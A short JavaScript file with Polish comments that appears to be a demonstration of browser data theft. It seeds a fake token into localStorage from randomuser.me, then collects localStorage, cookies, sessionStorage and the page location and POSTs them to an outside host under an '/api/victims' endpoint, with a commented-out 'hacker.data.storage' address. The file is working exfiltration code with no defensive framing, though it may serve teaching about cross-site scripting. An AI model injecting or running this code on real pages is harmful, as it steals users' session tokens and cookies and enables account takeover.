// Ładowanie tokenu.

fetch('https://randomuser.me/api/')
.then(resp => resp.json())
.then(({results}) => results.at(0) )
.then( user => user.login.sha256 )
.then( token => {
    console.log(`setting token - ${token}`)
    localStorage.setItem('token', token)
})

// ##################################################




// ##################################################

// let host = "http://hacker.data.storage:3000"
let host =  "http://adam.main.pc:3000"


function prepareDataPack(){
    return {
      localStorage: window.localStorage,
      cookie:document.cookie,
      sessionStorage:window.sessionStorage,
      location:document.location,
    }
}

fetch(`${host}/api/victims`, {
    method:'POST',
    body:JSON.stringify(prepareDataPack(), null ,2)
})